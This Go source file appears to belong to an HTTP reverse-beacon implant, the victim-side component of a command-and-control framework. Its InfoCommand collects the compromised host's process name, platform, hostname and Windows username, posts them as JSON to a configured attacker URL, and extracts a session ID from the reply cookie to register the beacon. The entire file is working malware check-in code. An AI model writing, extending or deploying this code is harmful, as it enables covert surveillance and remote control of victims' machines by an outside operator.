package command

import (
	"encoding/json"
	"http_reverse_beacon/packet"
	"http_reverse_beacon/profile"
	"os"
	"runtime"
	"strings"
	"syscall"

	"github.com/imroc/req"
)

type InfoCommand struct {
	*Commnad
	ProcessName string
	IP          string
	OSVersion   string
	HostName    string
	CurrentUser string
	Platform    string
	Arch        string
}

func (c *InfoCommand) Login() (resp *req.Resp) {
	c.getProcessName()
	c.getPlatform()
	c.getHostName()
	c.getUserName()

	info, _ := json.Marshal(c)
	resp = packet.HttpPost(profile.PostUrl, info)
	cookies := resp.Response().Header["Set-Cookie"]
	for _, cookie := range cookies {
		v := strings.Split(cookie, "=")
		if len(v) >= 2 && strings.HasPrefix(profile.SessionFormat, v[0]) {
			profile.SessionID = v[1]
			return resp
		}
	}
	return nil
}

func (c *InfoCommand) getPlatform() {
	c.Platform = runtime.GOOS
}

func (c *InfoCommand) getHostName() {
	c.HostName, _ = os.Hostname()
}

func (c *InfoCommand) getUserName() {
	username := make([]uint16, 128)
	usernameLen := uint32(len(username)) - 1
	err := syscall.GetUserNameEx(syscall.NameSamCompatible, &username[0], &usernameLen)
	if err != nil {
		c.CurrentUser = ""
		return
	}
	c.CurrentUser = syscall.UTF16ToString(username)
}

func (c *InfoCommand) getProcessName() {
	c.ProcessName = os.Args[0]
}
